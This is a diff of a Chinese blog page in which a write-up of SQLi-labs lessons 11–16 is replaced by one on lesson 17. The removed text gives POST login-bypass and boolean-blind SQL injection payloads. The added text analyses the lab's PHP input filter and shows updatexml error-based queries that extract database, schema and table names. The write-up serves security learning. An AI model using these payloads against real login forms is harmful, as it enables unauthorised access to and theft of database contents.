@@ -20,32 +20,29 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="less 11这关让我们输入账号密码，而不是简单的?id&#x3D;1，所以直接夹断.  代理抓包发现题与以往不同 以往采用的是get方法，而这里是post方法，以至于我们在submit之无法看到输入的usename和password 但是本质上还是之前的报错注入，不过是基于post的提交方式  利用抓包得到的信息可知上传的data为：uname&#x3D;&amp;passwd&#x3D;&amp;submit&#x3D;%E6%8F">
+<meta name="description" content="less17的注入过滤123456789101112131415161718192021222324252627function check_input($value)	&amp;#123;	if(!empty($value))		&amp;#123;		&#x2F;&#x2F; truncation (see comments)		$value &#x3D; substr($value,0,15);		&amp;#125;		&#x2F;&#x2F; Stripsla">
 <meta property="og:type" content="article">
-<meta property="og:title" content="less11-16">
-<meta property="og:url" content="http://example.com/2021/11/06/less11/index.html">
+<meta property="og:title" content="less17-">
+<meta property="og:url" content="http://example.com/2021/11/10/less17/index.html">
 <meta property="og:site_name" content="wds">
-<meta property="og:description" content="less 11这关让我们输入账号密码，而不是简单的?id&#x3D;1，所以直接夹断.  代理抓包发现题与以往不同 以往采用的是get方法，而这里是post方法，以至于我们在submit之无法看到输入的usename和password 但是本质上还是之前的报错注入，不过是基于post的提交方式  利用抓包得到的信息可知上传的data为：uname&#x3D;&amp;passwd&#x3D;&amp;submit&#x3D;%E6%8F">
+<meta property="og:description" content="less17的注入过滤123456789101112131415161718192021222324252627function check_input($value)	&amp;#123;	if(!empty($value))		&amp;#123;		&#x2F;&#x2F; truncation (see comments)		$value &#x3D; substr($value,0,15);		&amp;#125;		&#x2F;&#x2F; Stripsla">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2021/11/06/gwi27DpZWobJkRd.png">
-<meta property="og:image" content="https://i.loli.net/2021/11/06/13BEjwb6MlFcCOD.png">
-<meta property="og:image" content="https://i.loli.net/2021/11/07/wF5CMxKoJOG1NcV.png">
-<meta property="article:published_time" content="2021-11-06T03:00:03.000Z">
-<meta property="article:modified_time" content="2021-11-07T13:39:51.121Z">
+<meta property="og:image" content="https://i.loli.net/2021/11/10/AyNRDwTH7zcB5xV.png">
+<meta property="article:published_time" content="2021-11-10T11:51:06.000Z">
+<meta property="article:modified_time" content="2021-11-10T14:30:41.805Z">
 <meta property="article:author" content="发福的小菜狗">
-<meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/11/06/gwi27DpZWobJkRd.png">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/10/AyNRDwTH7zcB5xV.png">
 
 
-<link rel="canonical" href="http://example.com/2021/11/06/less11/">
+<link rel="canonical" href="http://example.com/2021/11/10/less17/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/11/06/less11/","path":"2021/11/06/less11/","title":"less11-16"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/11/10/less17/","path":"2021/11/10/less17/","title":"less17-"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>less11-16 | wds</title>
+<title>less17- | wds</title>
   
 
 
@@ -124,7 +121,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#less-11"><span class="nav-number">1.</span> <span class="nav-text">less 11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-12"><span class="nav-number">2.</span> <span class="nav-text">less 12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less13"><span class="nav-number">3.</span> <span class="nav-text">less13</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#less17%E7%9A%84%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="nav-number">1.</span> <span class="nav-text">less17的注入过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#UPDATEXML-XML-document-XPath-string-new-value-%E5%87%BD%E6%95%B0"><span class="nav-number">2.</span> <span class="nav-text">UPDATEXML (XML_document, XPath_string, new_value)函数</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -137,7 +134,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -187,7 +184,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/06/less11/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/10/less17/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -200,7 +197,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          less11-16
+          less17-
         </h1>
 
         <div class="post-meta-container">
@@ -210,24 +207,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
+      
 
-      <time title="Created: 2021-11-06 11:00:03" itemprop="dateCreated datePublished" datetime="2021-11-06T11:00:03+08:00">2021-11-06</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-11-07 21:39:51" itemprop="dateModified" datetime="2021-11-07T21:39:51+08:00">2021-11-07</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
-        </span>
+      <time title="Created: 2021-11-10 19:51:06 / Modified: 22:30:41" itemprop="dateCreated datePublished" datetime="2021-11-10T19:51:06+08:00">2021-11-10</time>
     </span>
 
   
@@ -240,43 +222,23 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="less-11"><a href="#less-11" class="headerlink" title="less 11"></a>less 11</h1><p>这关让我们输入账号密码，而不是简单的?id=1，所以直接夹断.</p>
-<p><img src="https://i.loli.net/2021/11/06/gwi27DpZWobJkRd.png" alt="QQ截图20211106114439.png"></p>
-<p>代理抓包发现题与以往不同</p>
-<p>以往采用的是get方法，而这里是post方法，以至于我们在submit之无法看到输入的usename和password</p>
-<p>但是本质上还是之前的报错注入，不过是基于post的提交方式</p>
-<p><img src="https://i.loli.net/2021/11/06/13BEjwb6MlFcCOD.png" alt="QQ截图20211106115325.png"></p>
-<p>利用抓包得到的信息可知上传的data为：uname=&amp;passwd=&amp;submit=%E6%8F%90%E4%BA%A4</p>
-<p>所以基于此，进行报错注入</p>
-<p>首先我们不知道账号密码，利用注释符和 or 1=1使其为真</p>
-<p>uname=n‘ or 1=1 #&amp;passwd=&amp;submit=%E6%8F%90%E4%BA%A4</p>
-<p>这样无论账号存不存在都可以登入（猜的）</p>
-<p>事实也是这样，这里返回了账号密码和我们输入的不一样，但是我们知道我们成功登入了，注释符以前的內容是可执行的这样接下来就是类似less1的内容</p>
-<p>order by n 查看列数</p>
-<p>union select 1，2，。。n查看回显</p>
-<p>按照回显来嵌套</p>
-<p>select database();</p>
-<p>select schema_name from information_schema.schemata;</p>
-<p>select table_name from information_schema.tables where table_schema=’A’;</p>
-<p>select column_name from information_schema.column where table_name=’B’;</p>
-<p>select username,password from where A.B;</p>
-<p>利用group_concat()和concat_ws()来简便操作</p>
-<p><img src="https://i.loli.net/2021/11/07/wF5CMxKoJOG1NcV.png" alt="QQ截图20211107111426.png"></p>
-<h1 id="less-12"><a href="#less-12" class="headerlink" title="less 12"></a>less 12</h1><p>同理同法，不过是把单引号改为双引号单括号。</p>
-<p>测试注入可以依次测试’  ,  ‘)  ,  ‘))  ,  “  ,  “)  ,  “))六种</p>
-<h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>同样操作</p>
-<p>post data：uname=1’) or 1=1#&amp;passwd=1&amp;submit=Submit</p>
-<p>这次没有报错，但也没有回显</p>
-<p>属于布尔盲注</p>
-<p>post data：uname=1’) or length(database()&gt;1#&amp;passwd=1&amp;submit=Submit来判断数据库名长度</p>
-<p>post data：uname=1’) or left（（select schema_name from information_schema.schemata limit 0,1）,1）=’a’#&amp;passwd=1&amp;submit=Submit来判断列名</p>
-<p>PS：or左右两边其中一边为真都为真，已知左为假，所以只有有报错则右边为假就会报错，所以利用此来破解库名，表名，列名。</p>
-<p>利用工具进行爆破详见less5,6总结</p>
-<p>13     (‘’)</p>
-<p>14      “”</p>
-<p>15       ‘’</p>
-<p>16       (“”)</p>
-<p>less13,14,15,16同样的方法只是对数据的包裹方式不同。</p>
+        <h1 id="less17的注入过滤"><a href="#less17的注入过滤" class="headerlink" title="less17的注入过滤"></a>less17的注入过滤</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>substr（$value，0,15）；首先截取前16个字符</p>
+<p>magic_quotes_gpc()函数在php中作用是判断用户提供数据，如包括有：post，get，cookie过来的数据增加转义字符“\”,以确保这些数据不会引起程序的错误</p>
+<p>ctype_digit()判断是不是纯的数字</p>
+<p> mysql_real_escape_string()调用mysql库的函数 mysql_real_escape_string,在以下字符前添加反斜杠：\x00,\n,\r,,‘,”,和\x1a，默认字符集。</p>
+<p><img src="https://i.loli.net/2021/11/10/AyNRDwTH7zcB5xV.png" alt="QQ浏览器截图20211110212406.png"></p>
+<p>只截取前16个字符，的同时注释（\）单引号</p>
+<p>但是它对密码部分没做注入过滤，所以只要有正确的账号就可以尝试在passwd=后面进行注入</p>
+<h1 id="UPDATEXML-XML-document-XPath-string-new-value-函数"><a href="#UPDATEXML-XML-document-XPath-string-new-value-函数" class="headerlink" title="UPDATEXML (XML_document, XPath_string, new_value)函数"></a>UPDATEXML (XML_document, XPath_string, new_value)函数</h1><p>XML_document是string格式，为XMl文档对象的名称</p>
+<p>XPath_string(Xpath格式的字符串)</p>
+<p>new_value为string格式，替换查找符合条件的数据</p>
+<p>该函数用于改变文档中符合条件的节点的值，意为改变XML_document中符合XPATH_string的值</p>
+<p>利用concat()函数只是将其拼接成字符串格式，来利用UPDATEXML (XML_document, XPath_string, new_value)函数报错出XPath_string的值</p>
+<p>select updatexml(1,concat(0x7e,(database())),1);</p>
+<p>select updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1);</p>
+<p>select updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table.schema=’security’ limit 0,1)),1);</p>
 
     </div>
 
@@ -285,19 +247,19 @@
     
 
     <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/11/04/less7-8/" rel="prev" title="less7-10">
-                  <i class="fa fa-chevron-left"></i> less7-10
+                <a href="/2021/11/06/less11-16/" rel="prev" title="less11-16">
+                  <i class="fa fa-chevron-left"></i> less11-16
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/2021/11/14/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" rel="next" title="无列名注入">
+                  无列名注入 <i class="fa fa-chevron-right"></i>
+                </a>
             </div>
           </div>
     </footer>
